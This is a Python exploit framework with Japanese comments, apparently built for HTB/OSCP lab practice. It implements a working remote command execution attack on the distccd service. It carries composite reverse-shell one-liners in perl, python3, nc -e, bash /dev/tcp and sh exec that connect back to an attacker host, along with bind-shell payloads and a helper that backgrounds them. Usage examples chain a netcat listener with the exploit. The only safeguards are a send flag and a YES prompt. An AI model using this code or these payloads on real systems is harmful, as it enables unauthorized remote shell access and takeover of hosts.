#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AUTHOR: seal-app

"""
exploit_base.py

【目的】
- HTB/OSCP ラボ用途の「プロトコル非依存」なエクスプロイト骨格を提供。
- ExploitBase に TCP 送受信の共通ロジック（no_wait / BG 化 / ログ / メタ / hexdumpなど）を集約。
- 各脆弱性固有のバイト列生成＆応答パースは具象クラスに閉じ込め、差し替え容易にする。

【使い方の流れ】
1) 目標サービスに対応する具象クラス（例: DistccExploit）を用意して
   - build_request(payload_cmd)
   - build_trailer()
   - parse_output(sock)
   を実装する（必要なら固有ヘルパも）。
2) main() 側は Exploit クラスを選んでインスタンス化→send_once()。
3) reverse/bind など「投げたら即戻りたい」場合は
   - payload を backgroundize() で BG 化
   - no_wait=True で応答を待たない運用にする（基底が吸収）

【安全設計】
- デフォルトは送信しない（--send が必要）
- 送信時は 'YES' とタイプしない限り送らない
- ログとメタ情報を ./logs/ 以下に保存

"""

import argparse
import binascii
import socket
import time
import os
import json
from datetime import datetime, timezone
from typing import Optional, Dict, Type

DEFAULT_LOG_DIR = "logs"

# =============================
# ユーティリティ（共通）
# =============================

def ensure_dir(p: str):
    """ディレクトリがなければ作る（再入可）"""
    os.makedirs(p, exist_ok=True)
    return p

def iso():
    """UTC timezone-aware ISO 8601 文字列"""
    return datetime.now(timezone.utc).isoformat()

# =============================
# 基底クラス：ExploitBase
# =============================

class ExploitBase:
    """
    すべてのエクスプロイトの共通基盤。
    - ログ/メタ出力
    - 送受信テンプレート（send_once）
    - 厳密読み取り（_read_exact）
    - BG 化ヘルパ（backgroundize）
    - 代表的な reverse/bind payload 生成

    ★ サブクラスが実装すべきもの（プロトコル固有）:
      - build_request(payload_cmd) -> bytes
      - build_trailer() -> bytes
      - parse_output(sock: socket.socket) -> dict
    """
    def __init__(self,
                 target: Optional[str],
                 port: int,
                 timeout: float,
                 send: bool,
                 show: bool,
                 cmd: str,
                 log_dir: str = DEFAULT_LOG_DIR,
                 no_wait: bool = False):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.send = send
        self.show = show
        self.cmd = cmd
        self.no_wait = no_wait

        # セッション情報（ログ/メタ）
        self.started_at = iso()
        self.session_id = self.started_at.replace(":", "_")
        self.log_dir = ensure_dir(log_dir)
        self.prefix = f"{self.__class__.__name__}_{self.session_id}"
        self.proof_path = os.path.join(self.log_dir, f"{self.prefix}.log")
        self.meta_path = os.path.join(self.log_dir, f"{self.prefix}.json")

        # 初期メタ書き出し
        self._write_meta({
            "class": self.__class__.__name__,
            "started_at": self.started_at,
            "target": self.target,
            "port": self.port,
            "timeout": self.timeout,
            "send": self.send,
            "show": self.show,
            "cmd": self.cmd,
            "no_wait": self.no_wait,
        })

    # ---- ログ/メタ ----
    def _write_meta(self, obj: dict):
        ensure_dir(self.log_dir)
        with open(self.meta_path, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2, ensure_ascii=False)

    def hexdump(self, b: bytes) -> str:
        """バイナリ→HEX文字列"""
        return binascii.hexlify(b).decode()

    def log_line(self, text: str):
        """標準出力＋ファイルへ1行ログ"""
        ensure_dir(self.log_dir)
        with open(self.proof_path, "a", encoding="utf-8") as f:
            f.write(text + "\n")
        print(text)

    # ---- プロトコル非依存のヘルパ ----
    @staticmethod
    def backgroundize(cmd: str, quiet: bool = True) -> str:
        """
        与えたコマンド列をサブシェルで BG 化して即時リターンさせる。
        reverse/bind や長時間ブロックする処理を投げる際に有効。
        quiet=True の場合は stdout/stderr を捨てる。
        """
        redir = " >/dev/null 2>&1" if quiet else ""
        return f"( {cmd} ){redir} &"

    @staticmethod
    def make_reverse_payload(lhost: str, lport: int) -> str:
        """
        複数ワンライナーを ' || ' 連結で順試行する合成 reverse-shell。
        環境差に強くするため、成功率の高い順に並べる。
        """
        perl = (
            "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
            % (lhost, lport)
        )
        python3 = (
            "python3 -c 'import socket,os,pty;"
            "s=socket.socket();s.connect((\"%s\",%d));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "pty.spawn(\"/bin/sh\")'" % (lhost, lport)
        )
        nc_e = f"nc -e /bin/sh {lhost} {lport}"                         # 実装差で -e 不可がある
        bash_dev_tcp = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"      # bash のみ
        sh_exec = f"exec 5<>/dev/tcp/{lhost}/{lport}; sh <&5 >&5 2>&5"  # sh では不可多い
        return " || ".join([perl, python3, nc_e, bash_dev_tcp, sh_exec])

    @staticmethod
    def make_bind_payload(bind_port: int) -> str:
        """
        bind shell の合成ワンライナー群
        """
        nc_maybe   = f"nc -l -p {bind_port} -e /bin/sh"
        busybox_nc = f"busybox nc -l -p {bind_port} -e /bin/sh"
        python_bind = (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket();s.bind((\"0.0.0.0\",%d));s.listen(1);c,a=s.accept();"
            "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'" % (bind_port)
        )
        return " || ".join([nc_maybe, busybox_nc, python_bind])

    # ---- ソケット読取（再利用）----
    def _read_exact(self, sock: socket.socket, n: int) -> bytes:
        """タイムアウト付きで n バイト厳密読み取り。短い/EOF/timeout ならある分だけ返す。"""
        sock.settimeout(self.timeout)
        data = b""
        while len(data) < n:
            try:
                chunk = sock.recv(n - len(data))
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        return data

    # ---- 共通送信テンプレート ----
    def send_once(self, data: bytes, trailer: bytes) -> Optional[Dict]:
        """
        TCP 一発送信の共通実装。
        - self.no_wait=True → 送信後に応答を待たず戻る（reverse/bind 向け）
        - 応答を待つ場合はサブクラスの parse_output(sock) に委譲
        """
        if not self.send:
            self.log_line("[*] SEND flag is OFF (safe mode). Not sending.")
            return None
        assert self.target, "--send requires --target"
        self.log_line(f"[!] About to send one-shot to {self.target}:{self.port}")
        confirm = input("Type EXACTLY 'YES' to proceed: ")
        if confirm != "YES":
            self.log_line("[*] Aborted by user.")
            return None

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((self.target, self.port))
                s.sendall(data)
                s.sendall(trailer)
                self.log_line("[*] Request + trailer sent.")
                if self.no_wait:
                    self.log_line("[*] no-wait mode: not waiting for response (fire-and-forget).")
                    return {"note": "no-wait"}
                # 応答を待つモード：具象が parse_output を実装している前提
                if hasattr(self, "parse_output") and callable(getattr(self, "parse_output")):
                    return self.parse_output(s)
                # フォールバック（生読み）
                s.settimeout(self.timeout)
                try:
                    buf = s.recv(65536)
                    return {"raw": buf}
                except socket.timeout:
                    return {"raw": b""}
        except Exception as e:
            self.log_line(f"[!] send_once failed: {e}")
            return None

# =============================
# 具象クラス：distccd 例
# =============================

class DistccExploit(ExploitBase):
    """
    distccd（3632/TCP）向け簡易実装。
    - build_request/build_trailer：DIST/ARGC/ARGV/DOTI の最小要素のみ実装
    - parse_output：24B ヘッダ後に stderr/stdout 長（8桁hex ASCII→big-endian）を読み取る簡易仕様
    """
    def __init__(self,
                 target: Optional[str] = None,
                 port: int = 3632,
                 timeout: float = 6.0,
                 send: bool = False,
                 show: bool = True,
                 cmd: str = "id",
                 log_dir: str = DEFAULT_LOG_DIR,
                 no_wait: bool = False):
        super().__init__(target, port, timeout, send, show, cmd, log_dir=log_dir, no_wait=no_wait)

    # ---- 組立 ----
    def _pack_argv(self, s: str) -> bytes:
        b = s.encode()
        return ("ARGV%08x" % len(b)).encode() + b

    def build_request(self, payload_cmd: str) -> bytes:
        args = ["sh", "-c", payload_cmd, "#", "-c", "main.c", "-o", "main.o"]
        out = bytearray()
        out.extend(b"DIST00000001")
        out.extend(("ARGC%08x" % len(args)).encode())
        for a in args:
            out.extend(self._pack_argv(a))
        return bytes(out)

    def build_trailer(self) -> bytes:
        tag = ("%s" % int(time.time()))[-10:]
        tb = tag.encode()
        return b"DOTI" + ("%08x" % len(tb)).encode() + tb + b"\n"

    # ---- パース ----
    def _read_hex_len(self, sock: socket.socket) -> Optional[int]:
        t = self._read_exact(sock, 4)   # タグ捨て（ここでは未使用）
        if not t or len(t) < 4:
            return None
        hx = self._read_exact(sock, 8)  # 8桁 hex ASCII
        if not hx or len(hx) < 8:
            return None
        try:
            raw = binascii.unhexlify(hx)
            return int.from_bytes(raw, "big")
        except Exception:
            return None

    def parse_output(self, sock: socket.socket) -> dict:
        result = {"stderr": "", "stdout": ""}
        hdr = self._read_exact(sock, 24)  # 24B ヘッダ
        if not hdr or len(hdr) != 24:
            self.log_line("[!] No/short header (expected 24 bytes).")
            return result
        # stderr
        n = self._read_hex_len(sock)
        if n and n > 0:
            data = self._read_exact(sock, n)
            result["stderr"] = data.decode(errors="replace")
        # stdout
        n = self._read_hex_len(sock)
        if n and n > 0:
            data = self._read_exact(sock, n)
            result["stdout"] = data.decode(errors="replace")
        return result

# =============================
# 将来拡張のためのレジストリ
# =============================

# 新しい脆弱性用クラスを追加したら、ここに登録するだけで CLI から選べます。
EXPLOIT_REGISTRY: Dict[str, Type[ExploitBase]] = {
    "distcc": DistccExploit,
    # "rsync": RsyncExploit,   # 追加例
    # "exim": EximExploit,
    # "smtp_cmdinj": SMTPCommandInjectExploit,
}

# =============================
# CLI / main
# =============================

def build_arg_parser() -> argparse.ArgumentParser:
    epilog = r"""
Examples:
  # 1) 生成だけ（送らない、安全）
  python3 exploit_tcp_template.py --exploit distcc --payload cmd --cmd "id"

  # 2) reverse shell を生成して内容確認（送らない安全モード）
  python3 exploit_tcp_template.py --exploit distcc --payload reverse --lhost 10.10.14.2 --lport 4444

  # 3) 実際に1回だけ送信（要ラボ許可・YES入力）
  python3 exploit_tcp_template.py --exploit distcc --payload cmd --cmd "id" \
    --target 10.10.10.3 --send

  # 4) reverse を BG 化 + 応答待たずに投げる（典型）
  rlwrap nc -lvnp 4444 &
  python3 exploit_tcp_template.py --exploit distcc --payload reverse \
    --lhost 10.10.14.2 --lport 4444 \
    --target 10.10.10.3 --send --no-wait

  # 5) bind shell（BG 化推奨）
  python3 exploit_tcp_template.py --exploit distcc --payload bind --bind-port 5555 \
    --target 10.10.10.3 --send --no-wait
"""
    p = argparse.ArgumentParser(
        description=(
            "TCP exploit helper (HTB/OSCP lab). "
            "Protocol-agnostic send/recv policy lives in ExploitBase; "
            "protocol-specific request/response are implemented by exploit classes."
        ),
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=epilog
    )
    # どの具象クラスを使うか（将来拡張しやすく）
    p.add_argument("--exploit", choices=sorted(EXPLOIT_REGISTRY.keys()),
                   default="distcc", help="Exploit class to use (default: distcc)")
    p.add_argument("--list-exploits", action="store_true",
                   help="List available exploit classes and exit")

    # payload 種別
    p.add_argument("--payload", choices=["cmd", "reverse", "bind"], default="cmd",
                   help="cmd: --cmd を実行 / reverse: --lhost/--lport / bind: --bind-port")
    p.add_argument("--cmd", type=str, default="id",
                   help="Command to run for --payload cmd")
    p.add_argument("--lhost", type=str,
                   help="Attacker IP for --payload reverse")
    p.add_argument("--lport", type=int,
                   help="Attacker port for --payload reverse")
    p.add_argument("--bind-port", type=int,
                   help="Bind shell port on target for --payload bind")

    # 送信先/動作
    p.add_argument("--target", type=str,
                   help="Target IP (required with --send)")
    p.add_argument("--port", type=int, default=3632,
                   help="Target port (default 3632 for distccd; override per service)")
    p.add_argument("--timeout", type=float, default=6.0,
                   help="Socket timeout seconds")
    p.add_argument("--send", action="store_true",
                   help="Actually send once (LAB ONLY; interactive 'YES' required)")
    p.add_argument("--no-wait", action="store_true",
                   help="Do not wait for response (fire-and-forget / reverse/bind typical)")
    p.add_argument("--bg", action="store_true",
                   help="Backgroundize payload before embedding (wrap with subshell &)")
    p.add_argument("--show", action="store_true",
                   help="Show generated payload and packet")
    p.add_argument("--log-dir", type=str, default=DEFAULT_LOG_DIR,
                   help="Directory to write logs and JSON meta")

    return p

def main():
    parser = build_arg_parser()
    args = parser.parse_args()

    # 利用可能クラス一覧だけ見たいとき
    if args.list_exploits:
        print("[*] Available exploits:")
        for k in sorted(EXPLOIT_REGISTRY.keys()):
            print("   -", k)
        return

    # Exploit クラスを選ぶ（例: distcc）
    ExploitCls = EXPLOIT_REGISTRY[args.exploit]

    # ---- ペイロードを生成（基底のヘルパで OK）----
    if args.payload == "cmd":
        payload_cmd = args.cmd
    elif args.payload == "reverse":
        if not args.lhost or not args.lport:
            print("[!] --lhost and --lport are required for reverse payload")
            return
        payload_cmd = ExploitBase.make_reverse_payload(args.lhost, args.lport)
    elif args.payload == "bind":
        if not args.bind_port:
            print("[!] --bind-port is required for bind payload")
            return
        payload_cmd = ExploitBase.make_bind_payload(args.bind_port)
    else:
        payload_cmd = args.cmd  # safety net

    # reverse/bind や --no-wait/--bg 指定時は BG 化を推奨
    auto_bg = args.bg or args.no_wait or (args.payload in ["reverse", "bind"])
    if auto_bg:
        payload_cmd = ExploitBase.backgroundize(payload_cmd)

    # ---- Exploit インスタンス生成（←ここは具象を差し替えるだけで再利用可）----
    ex = ExploitCls(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        send=args.send,
        show=args.show,
        cmd=payload_cmd,
        log_dir=args.log_dir,
        no_wait=args.no_wait
    )

    # プロトコル固有のパケット生成
    req = ex.build_request(payload_cmd)
    trailer = ex.build_trailer()

    # 生成物の確認（ペイロード／リクエスト／トレイラの ASCII/HEX）
    if args.show:
        print("=== Payload (sh -c '<payload>') ===")
        print(payload_cmd)
    ex.log_line("=== Payload ===")
    ex.log_line(payload_cmd)

    print("\n=== Generated Request (ASCII) ===")
    try:
        print(req.decode(errors="replace"))
    except Exception:
        print("<binary>")
    ex.log_line("=== Request ASCII ===")
    try:
        ex.log_line(req.decode(errors="replace"))
    except Exception:
        ex.log_line("<binary>")

    print("\n=== Generated Request (HEX) ===")
    print(ex.hexdump(req))
    ex.log_line("=== Request HEX ===")
    ex.log_line(ex.hexdump(req))

    print("\n=== Trailer (ASCII) ===")
    try:
        print(trailer.decode(errors="replace"))
    except Exception:
        print("<binary>")
    ex.log_line("=== Trailer ASCII ===")
    try:
        ex.log_line(trailer.decode(errors="replace"))
    except Exception:
        ex.log_line("<binary>")

    print("\n=== Trailer (HEX) ===")
    print(ex.hexdump(trailer))
    ex.log_line("=== Trailer HEX ===")
    ex.log_line(ex.hexdump(trailer))

    # 実送信（SAFE: --send がない限り送らない）
    if args.send:
        if not args.target:
            print("[!] --target is required when --send is used")
            return
        res = ex.send_once(req, trailer)
        if res is None:
            print("[*] No response (aborted/failed).")
            return
        # 具象パーサが返す想定（stderr/stdout）
        stderr = res.get("stderr", "") if isinstance(res, dict) else ""
        stdout = res.get("stdout", "") if isinstance(res, dict) else ""
        note   = res.get("note", "")   if isinstance(res, dict) else ""
        if note:
            print("[*] Note:", note)
        if stderr:
            print("\n--- STDERR ---\n", stderr)
            ex.log_line("--- STDERR ---")
            ex.log_line(stderr)
        if stdout:
            print("\n--- STDOUT ---\n", stdout)
            ex.log_line("--- STDOUT ---")
            ex.log_line(stdout)
    else:
        print("\n[*] Safe mode: not sending. Use --send --target <IP> to transmit (lab only).")
        print("[*] This script will prompt for EXACT 'YES' before sending.")

if __name__ == "__main__":
    main()